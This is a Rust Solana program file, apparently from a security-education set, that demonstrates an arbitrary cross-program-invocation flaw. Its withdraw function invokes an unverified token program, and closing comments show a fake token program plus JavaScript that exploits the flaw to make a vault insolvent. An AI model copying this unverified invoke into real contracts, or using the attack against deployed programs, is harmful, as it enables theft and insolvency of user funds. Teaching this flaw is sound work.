//! # VULNERABLE Implementation - Arbitrary CPI Attack
//!
//! ⚠️ WARNING: This code is intentionally INSECURE for educational purposes.
//! DO NOT use this pattern in production code!
//!
//! ## The Vulnerability
//!
//! This implementation invokes a "token_program" without verifying it's
//! actually the SPL Token Program. An attacker can pass any program and
//! have it invoked with the provided accounts and instruction data.

use pinocchio::{
    account_info::AccountInfo,
    program_error::ProgramError,
    instruction::{AccountMeta, Instruction},
    program::invoke,
    ProgramResult,
};

use crate::{
    read_pubkey, read_u64, write_u64,
    offsets, VAULT_DISCRIMINATOR, ID,
};

/// ❌ VULNERABLE: Transfer tokens without verifying token program
///
/// ## Expected Accounts
///
/// | Index | Writable | Description                    |
/// |-------|----------|--------------------------------|
/// | 0     | Yes      | User vault                     |
/// | 1     | Yes      | Token source account           |
/// | 2     | Yes      | Token destination account      |
/// | 3     | No       | Transfer authority             |
/// | 4     | No       | Owner (signer)                 |
/// | 5     | No       | Token program (UNVERIFIED!)    |
///
/// ## Security Flaw
///
/// We invoke accounts[5] without checking it's the Token Program.
/// Attacker can pass any program!
pub fn withdraw_vulnerable(accounts: &[AccountInfo], amount: u64) -> ProgramResult {
    if accounts.len() < 6 {
        return Err(ProgramError::NotEnoughAccountKeys);
    }
    
    let vault = &accounts[0];
    let token_from = &accounts[1];
    let token_to = &accounts[2];
    let authority = &accounts[3];
    let owner = &accounts[4];
    let token_program = &accounts[5];
    
    // Verify owner signed
    if !owner.is_signer() {
        return Err(ProgramError::MissingRequiredSignature);
    }
    
    // Verify vault owned by this program
    if !vault.is_owned_by(&ID) {
        return Err(ProgramError::InvalidAccountOwner);
    }
    
    // Read vault data
    let data = vault.try_borrow_data()?;
    if data[..8] != VAULT_DISCRIMINATOR {
        return Err(ProgramError::InvalidAccountData);
    }
    
    let vault_owner = read_pubkey(&data, offsets::OWNER);
    if owner.key() != &vault_owner {
        pinocchio::msg!("Invalid owner");
        return Err(ProgramError::InvalidAccountData);
    }
    
    let balance = read_u64(&data, offsets::BALANCE);
    if balance < amount {
        pinocchio::msg!("Insufficient balance");
        return Err(ProgramError::InsufficientFunds);
    }
    
    drop(data);
    
    // ❌ MISSING: Token program verification!
    //
    // We should check:
    // if token_program.key() != &program_ids::TOKEN_PROGRAM {
    //     return Err(ProgramError::IncorrectProgramId);
    // }
    //
    // Without this, attacker invokes any program!
    
    // Build transfer instruction
    // SPL Token transfer instruction format:
    // [3] = Transfer instruction discriminator
    // [amount as u64 LE bytes]
    let mut ix_data = [0u8; 9];
    ix_data[0] = 3;  // Transfer instruction
    ix_data[1..9].copy_from_slice(&amount.to_le_bytes());
    
    let ix = Instruction {
        program_id: token_program.key(),  // ❌ UNVERIFIED!
        accounts: vec![
            AccountMeta::new(*token_from.key(), false),
            AccountMeta::new(*token_to.key(), false),
            AccountMeta::new_readonly(*authority.key(), true),
        ],
        data: ix_data.to_vec(),
    };
    
    // ❌ VULNERABLE: Invoking unverified program!
    pinocchio::msg!("⚠️ Invoking token program: {:?}", token_program.key());
    pinocchio::msg!("⚠️ This program was NOT verified!");
    
    invoke(&ix, &[
        token_from.clone(),
        token_to.clone(),
        authority.clone(),
    ])?;
    
    // Update internal state
    let mut data = vault.try_borrow_mut_data()?;
    let new_balance = balance.checked_sub(amount)
        .ok_or(ProgramError::ArithmeticOverflow)?;
    write_u64(&mut data, offsets::BALANCE, new_balance);
    
    let total_withdrawn = read_u64(&data, offsets::TOTAL_WITHDRAWN);
    let new_total = total_withdrawn.checked_add(amount)
        .ok_or(ProgramError::ArithmeticOverflow)?;
    write_u64(&mut data, offsets::TOTAL_WITHDRAWN, new_total);
    
    pinocchio::msg!("⚠️ VULNERABLE: Withdrew {} tokens", amount);
    pinocchio::msg!("⚠️ Token program was NOT verified!");
    
    Ok(())
}

/*
 * ============================================================================
 * ATTACK DEMONSTRATION
 * ============================================================================
 *
 * FAKE TOKEN PROGRAM (Attacker deploys this):
 *
 * ```rust
 * pub fn process_instruction(
 *     program_id: &Pubkey,
 *     accounts: &[AccountInfo],
 *     instruction_data: &[u8],
 * ) -> ProgramResult {
 *     // Check if this is a "transfer" instruction
 *     if instruction_data[0] == 3 {
 *         // Real Token Program would:
 *         // 1. Verify authority signature
 *         // 2. Check source has enough tokens
 *         // 3. Debit source, credit destination
 *         
 *         // FAKE program does NOTHING:
 *         msg!("Fake transfer - not moving any tokens!");
 *         return Ok(());
 *     }
 *     
 *     Ok(())
 * }
 * ```
 *
 * ATTACK EXECUTION:
 *
 * ```javascript
 * // 1. Deploy FakeTokenProgram
 * const fakeProgram = await deployFakeProgram();
 * 
 * // 2. Call vulnerable withdraw
 * await program.methods
 *     .withdrawVulnerable(new BN(1000))
 *     .accounts({
 *         vault: userVault,
 *         tokenFrom: protocolTokenAccount,
 *         tokenTo: attackerTokenAccount,
 *         authority: authorityPda,
 *         owner: attacker.publicKey,
 *         tokenProgram: fakeProgram.programId,  // ❌ FAKE!
 *     })
 *     .signers([attacker])
 *     .rpc();
 * 
 * // 3. Result:
 * // - Vault state: balance decreased by 1000
 * // - Actual tokens: NOT MOVED!
 * // - Protocol is now insolvent
 * ```
 *
 * ============================================================================
 */